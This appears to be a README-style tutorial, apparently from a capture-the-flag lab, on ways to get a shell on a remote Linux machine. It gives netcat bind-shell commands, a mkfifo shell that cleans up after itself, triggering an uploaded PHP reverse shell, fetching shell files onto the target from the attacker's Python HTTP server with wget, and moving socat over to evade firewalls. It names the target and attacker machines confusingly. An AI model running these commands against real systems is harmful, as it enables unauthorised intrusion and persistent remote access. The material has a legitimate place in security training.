# Various-process-of-getting-shell-access
Here We'll discuss how to get a shell in multiple ways -->

## For-Linuc-Remote-PC:

First assume your ****ATTACK/HACKER PC IP** is **10.10.201.217** & your **REMOTE/ATTACKING/TARGET PC IP** is **10.10.152.101**

### _**Type-1: Simple bind shell using netcat**_

This is the easiest process. Assume you already has SSH ACCESS and netcat needs to be installed on both the devices.

1. Log in to Remote pc using ssh ID and pass. then type the below command in remote pc terminal-

   ` nc -lvnp 4000 -e /bin/bash`
   
   (this will create a Bind shell in remote pc and it starts looking for any conenction on it's 4000 port)

3. Now in attack pc terminal type

    `nc 10.10.152.101 4000` (this will connect you to remote pc shell using 4000 port)


INSTEAD of above **method-1's point 1** you can use **below command in remote pc** which will help you to **delete the execution files and details ones the job is done** -

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`


    Here's what each part of the command does:
    
        mkfifo /tmp/f: Creates a named pipe (FIFO) named /tmp/f. This is used for passing data between processes.
        
        nc -lvnp <PORT> < /tmp/f: Starts a netcat listener (nc) on the specified port (<PORT>) and reads input from the named pipe /tmp/f. When a connection is made, netcat pipes the input/output to /bin/sh, effectively spawning a shell.
        
        >/tmp/f 2>&1: Redirects standard output (stdout) and standard error (stderr) from the shell (/bin/sh) to the named pipe /tmp/f. This allows the output of commands executed on the shell to be sent back through the named pipe to the netcat listener.
        
        rm /tmp/f: Removes the named pipe /tmp/f after the shell session is closed, cleaning up the temporary file.


### _Type 2: using php-reverse-shell_ 
Assume you have uploaded a revershe shell file to the vulnerable web server by any means. Assume the file name is "shell.php" and it's in /var/www/html folder of 10.10.152.101 ip. Activate this file by typing below command in your browser in your attack machine

`http://10.10.152.101/shell.php`  (you'll see your browser starts loading and will become unresponsive, which means the shell has been activated)

Now try the below command in your attacking machine terminal

`nc -lvnp 1234`  (here the port number is the port number which you mentioned in your shell.php file)

you can create the shell file from your kali linux /usr/share/webshells folder or you can use https://www.revshells.com/ or https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary to generate and download the file

### _Type 3: by using temporary webserver_ 
If somehow you have access to remote pc from before fro time being then for further and future access you can upload the reverse shell directly to the remote pc. 

In this process first create the reverse shell file, then in the same directory type the below command to start a http server on any port

python3 -m http.server 8000 (it means a temporay http server has been created using python on port 8000)

then from remote pc download the file from attackers pc using the below command -

wget http://attacker-pc-ip:8000/path-to-shell-file

then after downloading it in remote pc, move it to /var/www/html folder or any other folder which you can access globally from anywhere. after that follow type 2 procedure to access later

USING SOCAT-
SOCAT creates encrypted shell which is very useful to evade IDEs and other firewalls . But for that both attacker and remote machine needs to have socat installed in it.
After gaining access by following above processes you can transfer the socat binary from your local machine to the target machine (with IP address 10.10.152.101)

scp /path/to/socat user@10.10.152.101:/path/to/destination (usually socat path is /usr/bin/socat or you can use which socat to check the path)

for socat you need user access otherwise it'll become very tough to use SOCAT.





